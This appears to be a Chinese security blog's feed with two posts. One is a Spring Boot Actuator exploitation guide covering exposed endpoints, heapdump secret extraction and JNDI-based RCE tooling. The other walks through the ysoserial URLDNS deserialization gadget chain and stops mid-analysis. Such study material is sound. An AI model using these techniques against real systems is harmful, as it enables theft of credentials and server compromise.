<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
    <generator uri="https://gohugo.io/" version="0.148.2">Hugo</generator><title type="html"><![CDATA[l1uyun]]></title>
    
    
    
            <link href="https://l1uyun.one/tags/sec/javasec/" rel="alternate" type="text/html" title="html" />
            <link href="https://l1uyun.one/tags/sec/javasec/index.xml" rel="alternate" type="application/rss+xml" title="rss" />
    <updated>2025-08-20T08:21:16+00:00</updated>
    
    
    
    
        <id>https://l1uyun.one/tags/sec/javasec/</id>
    
        
        <entry>
            <title type="html"><![CDATA[springboot利用]]></title>
            <link href="https://l1uyun.one/posts/javasec-springboot%E6%A1%86%E6%9E%B6%E5%88%A9%E7%94%A8/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/javasec-springboot%E6%A1%86%E6%9E%B6%E5%88%A9%E7%94%A8/</id>
            
            
            <published>2024-08-06T09:32:00+08:00</published>
            <updated>2024-11-21T21:21:15+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="springboot利用">springboot利用</h1>
<h1 id="前置知识">前置知识</h1>
<h2 id="springboot-actuator">SpringBoot Actuator</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 / ，2.x 版本则统一以 /actuator 为起始路径
</span></span><span style="display:flex;"><span>Spring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成 /appenv
</span></span></code></pre></div><p>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但是以 “默认安全” 来讲，不暴露出这些信息更加安全。</p>
<p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p>
<h2 id="配置不当而暴露的路由">配置不当而暴露的路由</h2>
<p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
<p>因为配置不当而暴露的默认内置路由可能会有：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/actuator
</span></span><span style="display:flex;"><span>/auditevents
</span></span><span style="display:flex;"><span>/autoconfig
</span></span><span style="display:flex;"><span>/beans
</span></span><span style="display:flex;"><span>/caches
</span></span><span style="display:flex;"><span>/conditions
</span></span><span style="display:flex;"><span>/configprops
</span></span><span style="display:flex;"><span>/docs
</span></span><span style="display:flex;"><span>/dump
</span></span><span style="display:flex;"><span>/env
</span></span><span style="display:flex;"><span>/flyway
</span></span><span style="display:flex;"><span>/health
</span></span><span style="display:flex;"><span>/heapdump
</span></span><span style="display:flex;"><span>/httptrace
</span></span><span style="display:flex;"><span>/info
</span></span><span style="display:flex;"><span>/intergrationgraph
</span></span><span style="display:flex;"><span>/jolokia
</span></span><span style="display:flex;"><span>/logfile
</span></span><span style="display:flex;"><span>/loggers
</span></span><span style="display:flex;"><span>/liquibase
</span></span><span style="display:flex;"><span>/metrics
</span></span><span style="display:flex;"><span>/mappings
</span></span><span style="display:flex;"><span>/prometheus
</span></span><span style="display:flex;"><span>/refresh
</span></span><span style="display:flex;"><span>/scheduledtasks
</span></span><span style="display:flex;"><span>/sessions
</span></span><span style="display:flex;"><span>/shutdown
</span></span><span style="display:flex;"><span>/trace
</span></span><span style="display:flex;"><span>/threaddump
</span></span><span style="display:flex;"><span>/actuator/auditevents
</span></span><span style="display:flex;"><span>/actuator/beans
</span></span><span style="display:flex;"><span>/actuator/health
</span></span><span style="display:flex;"><span>/actuator/conditions
</span></span><span style="display:flex;"><span>/actuator/configprops
</span></span><span style="display:flex;"><span>/actuator/env
</span></span><span style="display:flex;"><span>/actuator/info
</span></span><span style="display:flex;"><span>/actuator/loggers
</span></span><span style="display:flex;"><span>/actuator/heapdump
</span></span><span style="display:flex;"><span>/actuator/threaddump
</span></span><span style="display:flex;"><span>/actuator/metrics
</span></span><span style="display:flex;"><span>/actuator/scheduledtasks
</span></span><span style="display:flex;"><span>/actuator/httptrace
</span></span><span style="display:flex;"><span>/actuator/mappings
</span></span><span style="display:flex;"><span>/actuator/jolokia
</span></span><span style="display:flex;"><span>/actuator/hystrix.stream
</span></span></code></pre></div><p>其中对寻找漏洞比较重要接口的有：</p>
<p>/env、/actuator/env
GET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p>
<p>同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
<p>/refresh、/actuator/refresh
POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。</p>
<p>/restart、/actuator/restart
暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。</p>
<p>/jolokia、/actuator/jolokia
可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
<p>/trace、/actuator/httptrace
一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
<h2 id="漏洞检测">漏洞检测</h2>
<h3 id="检测清单">检测清单</h3>
<p><a href="https://github.com/LandGrey/SpringBootVulExploit" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/LandGrey/SpringBootVulExploit</a>
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_1.png" alt=""  />
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_2.png" alt=""  /></p>
<h3 id="黑盒发现">黑盒发现</h3>
<p>人工识别，BP插件</p>
<p>人工识别
1、网站图片文件是一个绿色的树叶。2、特有的报错信息。3、Whitelabel Error Page关键字
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_3.png" alt="|750"  /></p>
<p>BP插件
<a href="https://github.com/API-Security/APIKit" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/API-Security/APIKit</a>
打开BurpSuite页面,点击Extender然后选择Extensions,添加APIKit.jar
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_4.png" alt=""  />
安装好插件后啥都不用管，让数据包经过BP即可触发插件被动扫描
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_5.png" alt="|800"  /></p>
<h3 id="白盒发现">白盒发现</h3>
<p>pom.xml,引用库</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.springframework.boot<span style="color:#f92672">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>spring-boot-starter-actuator<span style="color:#f92672">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>配置文件Actuator设置全部暴露<code>management.endpoints.web.exposure.include=*</code>
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_6.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_7.png" alt=""  /></p>
<h2 id="信息泄露利用">信息泄露利用</h2>
<h3 id="内部路由泄露">内部路由泄露</h3>
<p><a href="https://github.com/AabyssZG/SpringBoot-Scan" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/AabyssZG/SpringBoot-Scan</a>
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_8.png" alt=""  />
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_9.png" alt=""  /></p>
<h3 id="heapdump敏感信息查询">heapdump敏感信息查询</h3>
<p>配置密码，AK/SK等</p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_10.png" alt="|800"  /></p>
<p>下载下来
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_11.png" alt=""  />
然后使用JDumpSPider工具来获取数据
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_12.png" alt=""  /></p>
<p>![](<a href="https://img.l1uyun.one/Pasted" target="_blank" rel="noopener nofollow noreferrer" >https://img.l1uyun.one/Pasted</a> image 20240806101506.png)</p>
<p>这里还有另外一款工具,支持关键词搜索
<a href="https://github.com/wyzxxz/heapdump_tool" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/wyzxxz/heapdump_tool</a>
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_14.png" alt="|750"  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_15.png" alt="|850"  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_16.png" alt=""  /></p>
<h2 id="漏洞利用">漏洞利用</h2>
<h3 id="框架漏洞">框架漏洞</h3>
<p><a href="https://github.com/AabyssZG/SpringBoot-Scan" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/AabyssZG/SpringBoot-Scan</a>
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_17.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_18.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_19.png" alt=""  /></p>
<h3 id="利用类漏洞来进行rce攻击">利用类漏洞来进行RCE攻击</h3>
<p>服务器上执行JNDIExploit工具(可以本地、也可以远程VPS上运行)
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_20.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_21.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_22.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_23.png" alt=""  /></p>
<h1 id="cms源码审计">CMS源码审计</h1>
<h2 id="安装源码">安装源码</h2>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_24.png" alt=""  />
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_25.png" alt=""  />
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_26.png" alt=""  />
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_27.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_28.png" alt=""  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_29.png" alt=""  />
起始就是把actuator的接口做了可视化
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_30.png" alt=""  /></p>
<h2 id="源码审计">源码审计</h2>
<p>从pom.xml看有没有调用Actuator库
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_31.png" alt=""  /></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>配置文件中Actuator设置是否为*(全部暴露)
</span></span><span style="display:flex;"><span>management.endpoints.web.exposure.include=*
</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_32.png" alt="|700"  /></p>
<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_33.png" alt="|700"  /></p>
<p>泄露安全(heapdump)
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_34.png" alt=""  />
使用heapdump敏感信息查询工具提取敏感信息
JDumpSpider
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-springboot%e6%a1%86%e6%9e%b6%e5%88%a9%e7%94%a8_image_35.png" alt="|750"  /></p>
<h1 id="一句话总结">一句话总结</h1>
<p>遇到springboot框架从两个方面去寻找安全问题：
1.泄露安全(是否泄露了内部路由及heapdump)
2.漏洞安全(利用相关框架漏洞检测工具测试是否存在漏洞)</p>
<h1 id="参考">参考</h1>
<p><a href="https://blog.csdn.net/m0_60571842/article/details/135096224" target="_blank" rel="noopener nofollow noreferrer" >WEB攻防-Java安全&amp;原生反序列化&amp;SpringBoot攻防&amp;heapdump提取&amp;CVE_java spring反序列化-CSDN博客</a></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/javasec" term="sec/javasec" label="sec/javasec" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[javasec-urldns链]]></title>
            <link href="https://l1uyun.one/posts/javasec-urldns%E9%93%BE/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/javasec-urldns%E9%93%BE/</id>
            
            
            <published>2024-08-03T15:51:23+08:00</published>
            <updated>2024-08-18T10:06:17+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="urldns链">urldns链</h1>
<p>URLDNS 是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p>
<p>虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤</p>
<ul>
<li>使⽤Java内置的类构造，对第三⽅库没有依赖,因此对java版本没有限制</li>
<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ul>
<h2 id="前置知识">前置知识</h2>
<h3 id="gadget">gadget</h3>
<p>Java反序列化漏洞产生漏洞的形式大致有两种,</p>
<ul>
<li>一种是上下文入口类的readObject方法中直接包含了危险操作(危险函数)且传入危险函数的参数可控(这种情况很少)</li>
<li>还有一种情况就是入口类的readObject方法中间接调用了其它类(B类),在B类中又调用了恶意的方法或调用了其它包含恶意方法的类,这种链式触发命令执行的结构被称为反序列化利用链,组成这种链式结构中的&quot;成员类&quot;被称为Gadget而这种链式结构被称为Gadget Chain,通过构造Gadget Chain可以进行反序列化攻击。</li>
</ul>
<h2 id="漏洞分析">漏洞分析</h2>
<p>ysoserial里是这样生成payload的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>             <span style="color:#75715e">//Avoid DNS resolution during payload creation</span>
</span></span><span style="display:flex;"><span>             <span style="color:#75715e">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span>
</span></span><span style="display:flex;"><span>             URLStreamHandler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SilentURLStreamHandler();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>             HashMap ht <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap(); <span style="color:#75715e">// HashMap that will contain the URL</span>
</span></span><span style="display:flex;"><span>             URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">null</span>, url, handler); <span style="color:#75715e">// URL to use as the Key</span>
</span></span><span style="display:flex;"><span>             ht.<span style="color:#a6e22e">put</span>(u, url); <span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>             Reflections.<span style="color:#a6e22e">setFieldValue</span>(u, <span style="color:#e6db74">&#34;hashCode&#34;</span>, <span style="color:#f92672">-</span>1); <span style="color:#75715e">// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">return</span> ht;
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SilentURLStreamHandler</span> <span style="color:#66d9ef">extends</span> URLStreamHandler {
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">protected</span> URLConnection <span style="color:#a6e22e">openConnection</span>(URL u) <span style="color:#66d9ef">throws</span> IOException {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">synchronized</span> InetAddress <span style="color:#a6e22e">getHostAddress</span>(URL u) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span> }
</span></span></code></pre></div><p>利用链</p>
<pre tabindex="0"><code>Gadget Chain:
  HashMap.readObject()
    HashMap.putVal()
      HashMap.hash()
        URL.hashCode()
</code></pre><p>urldns是yso中较为简单的一个gadget，所以这里可以直接通过正向分析的方式进行分析</p>
<p>看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 HashMap。因为触发反序列化的⽅法是 readObject,那么可以直奔 HashMap 类的 readObject ⽅法：</p>
<p>HashMap#readObject</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span>
</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">defaultReadObject</span>();
</span></span><span style="display:flex;"><span>        reinitialize();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (loadFactor <span style="color:#f92672">&lt;=</span> 0 <span style="color:#f92672">||</span> Float.<span style="color:#a6e22e">isNaN</span>(loadFactor))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">&#34;Illegal load factor: &#34;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>                                             loadFactor);
</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">readInt</span>();                <span style="color:#75715e">// Read and ignore number of buckets</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> mappings <span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readInt</span>(); <span style="color:#75715e">// Read number of mappings (size)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (mappings <span style="color:#f92672">&lt;</span> 0)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">&#34;Illegal mappings count: &#34;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>                                             mappings);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (mappings <span style="color:#f92672">&gt;</span> 0) { <span style="color:#75715e">// (if zero, use defaults)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Size the table using given load factor only if within</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// range of 0.25...4.0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> lf <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">min</span>(Math.<span style="color:#a6e22e">max</span>(0.<span style="color:#a6e22e">25f</span>, loadFactor), 4.<span style="color:#a6e22e">0f</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> fc <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)mappings <span style="color:#f92672">/</span> lf <span style="color:#f92672">+</span> 1.<span style="color:#a6e22e">0f</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> cap <span style="color:#f92672">=</span> ((fc <span style="color:#f92672">&lt;</span> DEFAULT_INITIAL_CAPACITY) <span style="color:#f92672">?</span>
</span></span><span style="display:flex;"><span>                       DEFAULT_INITIAL_CAPACITY :
</span></span><span style="display:flex;"><span>                       (fc <span style="color:#f92672">&gt;=</span> MAXIMUM_CAPACITY) <span style="color:#f92672">?</span>
</span></span><span style="display:flex;"><span>                       MAXIMUM_CAPACITY :
</span></span><span style="display:flex;"><span>                       tableSizeFor((<span style="color:#66d9ef">int</span>)fc));
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> ft <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)cap <span style="color:#f92672">*</span> lf;
</span></span><span style="display:flex;"><span>            threshold <span style="color:#f92672">=</span> ((cap <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY <span style="color:#f92672">&amp;&amp;</span> ft <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY) <span style="color:#f92672">?</span>
</span></span><span style="display:flex;"><span>                         (<span style="color:#66d9ef">int</span>)ft : Integer.<span style="color:#a6e22e">MAX_VALUE</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">@SuppressWarnings</span>({<span style="color:#e6db74">&#34;rawtypes&#34;</span>,<span style="color:#e6db74">&#34;unchecked&#34;</span>})
</span></span><span style="display:flex;"><span>                Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span> tab <span style="color:#f92672">=</span> (Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span>)<span style="color:#66d9ef">new</span> Node<span style="color:#f92672">[</span>cap<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>            table <span style="color:#f92672">=</span> tab;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> mappings; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
</span></span><span style="display:flex;"><span>                    K key <span style="color:#f92672">=</span> (K) s.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
</span></span><span style="display:flex;"><span>                    V value <span style="color:#f92672">=</span> (V) s.<span style="color:#a6e22e">readObject</span>();
</span></span><span style="display:flex;"><span>                putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>putVal这一段，这里调用了hash方法来处理key，跟进hash方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span>(Object key) {
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">int</span> h;
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span> (key <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">?</span> 0 : (h <span style="color:#f92672">=</span> key.<span style="color:#a6e22e">hashCode</span>()) <span style="color:#f92672">^</span> (h <span style="color:#f92672">&gt;&gt;&gt;</span> 16);
</span></span><span style="display:flex;"><span>   }
</span></span></code></pre></div><p>这里又调用了key.hashCode方法,这里的key是一个URL对象,让我们看看URL的hashCode方法：</p>
<p>URL#hashCode：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (hashCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> hashCode;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        hashCode <span style="color:#f92672">=</span> handler.<span style="color:#a6e22e">hashCode</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hashCode;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>在URL类的hashCode方法中，又调用了URLStreamHandler#hashCode，并将自身传递进去：</p>
<p>URLStreamHandler#hashCode</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span>(URL u) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h <span style="color:#f92672">=</span> 0;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the protocol part.</span>
</span></span><span style="display:flex;"><span>        String protocol <span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getProtocol</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (protocol <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
</span></span><span style="display:flex;"><span>            h <span style="color:#f92672">+=</span> protocol.<span style="color:#a6e22e">hashCode</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the host part.</span>
</span></span><span style="display:flex;"><span>        InetAddress addr <span style="color:#f92672">=</span> getHostAddress(u);
</span></span></code></pre></div><p>getHostAddress，正是这步触发了dns请求：</p>
